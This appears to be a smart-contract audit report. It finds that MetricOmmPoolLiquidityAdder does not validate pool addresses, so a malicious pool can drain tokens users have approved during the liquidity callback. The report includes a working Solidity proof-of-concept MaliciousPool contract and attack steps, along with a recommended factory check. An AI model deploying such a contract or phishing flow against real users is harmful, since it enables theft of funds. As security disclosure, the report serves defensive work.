The code confirms all claims. Let me verify the key facts:

1. `_addLiquidity` at line 193 calls `_setPayContext(pool, ...)` with no factory check before calling `pool.addLiquidity(...)` at line 194.
2. `metricOmmModifyLiquidityCallback` at line 164 only checks `msg.sender == expectedPool` — but `expectedPool` was set to the attacker-controlled address, so this passes trivially.
3. At line 169, `IMetricOmmPool(msg.sender).getImmutables()` is called on the malicious pool, giving it full control over `token0`/`token1`.
4. At lines 173/176, `pay(token0, payer, msg.sender, amount0Delta)` issues `safeTransferFrom(payer, maliciousPool, amount)` with no further validation.
5. `MetricOmmSwapRouterBase` at line 84 has `if (!FACTORY.isPool(caller)) revert ...` — `MetricOmmPoolLiquidityAdder` has no `FACTORY` immutable at all.
6. The NatSpec at lines 19–21 explicitly acknowledges the missing check, confirming it is not a hidden edge case but a documented gap.

---

Audit Report

## Title
Unvalidated Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User-Approved Tokens via Callback - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

## Summary
`MetricOmmPoolLiquidityAdder` stores any caller-supplied `pool` address into transient context without verifying it against the factory registry. A malicious pool contract can exploit the `metricOmmModifyLiquidityCallback` settlement path to pull any ERC-20 tokens the user has approved to the adder — up to the user-supplied `maxAmountToken0`/`maxAmountToken1` caps — and redirect them to itself. This results in direct, complete loss of user principal in a single transaction.

## Finding Description
`_addLiquidity` stores the caller-supplied `pool` directly into transient pay context and immediately calls `pool.addLiquidity(...)`: [1](#0-0) 

When the malicious pool calls back `metricOmmModifyLiquidityCallback`, the only caller check is `msg.sender == expectedPool`: [2](#0-1) 

This check passes trivially because `expectedPool` was set to the malicious pool address. The callback then calls `IMetricOmmPool(msg.sender).getImmutables()` — fully attacker-controlled — to obtain `token0`/`token1`: [3](#0-2) 

`pay` then issues `safeTransferFrom(payer, maliciousPool, amount)` with no further validation: [4](#0-3) 

By contrast, `MetricOmmSwapRouterBase._requireExpectedCallbackCaller` enforces a factory registry check that `MetricOmmPoolLiquidityAdder` entirely lacks: [5](#0-4) 

`MetricOmmPoolLiquidityAdder` has no `FACTORY` immutable and no `isPool` call anywhere. The NatSpec at lines 19–21 explicitly documents this gap, confirming it is a known missing guard rather than an intentional design invariant: [6](#0-5) 

The `addLiquidityWeighted` variant calls `_validateBinAndBinPosition` on the malicious pool before the probe, but the malicious pool can return any `slot0` values to pass that check: [7](#0-6) 

## Impact Explanation
A user who has approved `MetricOmmPoolLiquidityAdder` for any ERC-20 token and is tricked into calling `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address loses up to `maxAmountToken0` of any attacker-chosen token and up to `maxAmountToken1` of any second attacker-chosen token in a single transaction. Tokens are transferred directly to the attacker-controlled pool contract with no recovery path. This is a direct, complete loss of user principal meeting the Critical/High threshold under the allowed impact gate.

## Likelihood Explanation
The trigger requires the user to supply a malicious pool address. This is achievable via a phishing frontend substituting a legitimate pool address, social engineering ("add liquidity to this new pool"), or any integration that forwards a user-supplied pool address to the adder. No privileged access is required; any unprivileged actor can deploy a malicious pool contract. The attack is repeatable against any user who has granted an approval to the adder.

## Recommendation
Add a factory registry check in `_addLiquidity` (or at each public entry point) mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
// Store FACTORY as an immutable, consistent with MetricOmmSwapRouterBase
IMetricOmmPoolFactory internal immutable FACTORY;

function _addLiquidity(address pool, ...) internal returns (...) {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
```

## Proof of Concept
```solidity
contract MaliciousPool {
    address immutable attacker;
    address immutable victimToken; // e.g. USDC

    constructor(address _attacker, address _victimToken) {
        attacker = _attacker;
        victimToken = _victimToken;
    }

    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = victimToken;
        imm.token1 = victimToken;
    }

    function addLiquidity(address, uint80, LiquidityDelta memory, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        IMetricOmmModifyLiquidityCallback(msg.sender)
            .metricOmmModifyLiquidityCallback(
                1_000_000e6, // amount0Delta = maxAmountToken0
                0,
                abi.encode(uint8(1)) // KIND_PAY
            );
        return (1_000_000e6, 0);
    }
}

// Attack:
// 1. Victim approves LiquidityAdder for 1_000_000 USDC
// 2. Attacker tricks victim into calling:
liquidityAdder.addLiquidityExactShares(
    address(maliciousPool),
    victim,
    0,
    deltas,
    1_000_000e6, // maxAmountToken0
    0,
    ""
);
// Result: 1_000_000 USDC transferred from victim to maliciousPool
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L192-196)
```text
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L263-286)
```text
  function _validateBinAndBinPosition(
    address pool,
    int8 minimalCurBin,
    uint104 minimalPosition,
    int8 maximalCurBin,
    uint104 maximalPosition
  ) internal view {
    if (minimalCurBin > maximalCurBin) {
      revert CursorOutOfBounds(0, 0, minimalCurBin, minimalPosition, maximalCurBin, maximalPosition);
    }

    (, int8 curBinIdx, uint104 curPosInBin,,,) = PoolStateLibrary._slot0(pool);

    int256 curBin = curBinIdx;
    if (curBin < minimalCurBin || curBin > maximalCurBin) {
      revert CursorOutOfBounds(curBinIdx, curPosInBin, minimalCurBin, minimalPosition, maximalCurBin, maximalPosition);
    }
    if (curBinIdx == minimalCurBin && curPosInBin < minimalPosition) {
      revert CursorOutOfBounds(curBinIdx, curPosInBin, minimalCurBin, minimalPosition, maximalCurBin, maximalPosition);
    }
    if (curBinIdx == maximalCurBin && curPosInBin > maximalPosition) {
      revert CursorOutOfBounds(curBinIdx, curPosInBin, minimalCurBin, minimalPosition, maximalCurBin, maximalPosition);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L82-85)
```text
  function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
  }
```
